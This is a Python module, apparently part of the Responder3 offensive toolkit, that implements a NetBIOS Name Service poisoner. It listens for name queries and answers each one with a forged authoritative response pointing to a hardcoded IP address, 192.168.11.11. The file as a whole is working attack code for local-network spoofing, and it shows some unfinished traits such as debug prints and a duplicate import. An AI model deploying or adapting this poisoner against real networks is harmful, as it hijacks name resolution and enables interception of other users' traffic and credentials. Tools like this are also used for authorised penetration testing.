import io
import logging
import traceback
import socket
import enum
import traceback
import ipaddress

from responder3.newpackets.NetBIOS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP

class NBTNS(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)

	def modulename(self):
		return 'NBTS'

	def run(self):

		coro = self.loop.create_datagram_endpoint(
							protocol_factory=lambda: NBTNSProtocol(self),
							local_addr=(str(self.bind_addr), self.bind_port),
							family=socket.AF_INET
		)

		return self.loop.run_until_complete(coro)

	def handle(self, packet, addr, transport):
		try:
			#self.log(logging.DEBUG,'Handle called with data: ' + data.hex())
			print(repr(packet))
			pp = self.poison(packet, ipaddress.ip_address('192.168.11.11'))
			transport.sendto(pp.toBytes(), addr)
			self.log(logging.DEBUG,'Sending response!')
			

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

	def poison(self, requestPacket, poisonAddr, poisonName = None):
		self.log(logging.DEBUG,'Poisoning!')
		res = NBResource()
		res.construct(requestPacket.Questions[0].QNAME, NBRType.NB, poisonAddr)
		pp = NBTNSPacket()

		pp.construct(TID = requestPacket.NAME_TRN_ID, 
					 response = NBTSResponse.RESPONSE, 
					 opcode = NBTNSOpcode.QUERY, 
					 nmflags = NBTSNMFlags.AUTHORATIVEANSWER | NBTSNMFlags.RECURSIONDESIRED, 
					 answers= [res])

		return pp
		


class NBTNSProtocol(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)

	def _parsebuff(self, addr):
		packet = NBTNSPacket(io.BytesIO(self._buffer))
		self._server.handle(packet, addr, self._transport)